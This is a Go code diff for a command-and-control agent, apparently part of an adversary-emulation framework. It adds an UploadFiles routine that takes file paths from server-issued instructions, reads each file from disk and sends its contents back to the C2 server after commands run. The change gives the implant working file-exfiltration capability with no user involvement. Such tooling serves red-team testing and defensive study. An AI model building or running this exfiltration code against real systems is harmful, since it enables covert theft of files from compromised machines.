@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io/ioutil"
 	"os"
 	"path/filepath"
 	"reflect"
@@ -42,6 +43,7 @@ type AgentInterface interface {
 	DiscoverPeers()
 	AttemptSelectComChannel(requestedChannelConfig map[string]string, requestedChannel string) error
 	GetCurrentContactName() string
+	UploadFiles(instruction map[string]interface{})
 }
 
 // Implements AgentInterface
@@ -256,6 +258,41 @@ func (a *Agent) RunInstruction(instruction map[string]interface{}, payloads []st
 		output.VerbosePrint(fmt.Sprintf("[*] Submitting results for link %s via C2 channel %s", result["id"].(string), a.GetCurrentContactName()))
 		a.beaconContact.SendExecutionResults(a.GetTrimmedProfile(), result)
 	}
+
+ 	// Perform any uploads after sending execution results
+ 	a.UploadFiles(instruction)
+}
+
+func (a *Agent) UploadFiles(instruction map[string]interface{}) {
+	if instruction["uploads"] != nil && len(instruction["uploads"].([]interface{})) > 0 {
+		uploads, ok := instruction["uploads"].([]interface{})
+		if !ok {
+			output.VerbosePrint(fmt.Sprintf(
+				"[!] Error: expected []interface{}, but received %T for upload info",
+				instruction["uploads"],
+			))
+			return
+		}
+
+		for _, path := range uploads {
+			filePath := path.(string)
+			if err := a.uploadSingleFile(filePath); err != nil {
+				output.VerbosePrint(fmt.Sprintf("[!] Error uploading file %s: %v", filePath, err.Error()))
+			}
+		}
+	}
+}
+
+func (a *Agent) uploadSingleFile(path string) error {
+	output.VerbosePrint(fmt.Sprintf("Uploading file: %s", path))
+
+	// Get file bytes
+	fetchedBytes, err := ioutil.ReadFile(path)
+	if err != nil {
+		return err
+	}
+
+	return a.beaconContact.UploadFileBytes(a.GetFullProfile(), filepath.Base(path), fetchedBytes)
 }
 
 // Sets the communication channels for the agent according to the specified channel configuration map.
@@ -268,6 +305,8 @@ func (a *Agent) SetCommunicationChannels(requestedChannelConfig map[string]strin
 		if requestedChannel, ok := requestedChannelConfig["c2Name"]; ok {
 			if err := a.AttemptSelectComChannel(requestedChannelConfig, requestedChannel); err == nil {
 				return nil
+			} else {
+				output.VerbosePrint(fmt.Sprintf("[!] Error setting comm channel: %v", err.Error()))
 			}
 		}
 		// Original requested channel not found. See if we can use any available peer-to-peer-proxy receivers.
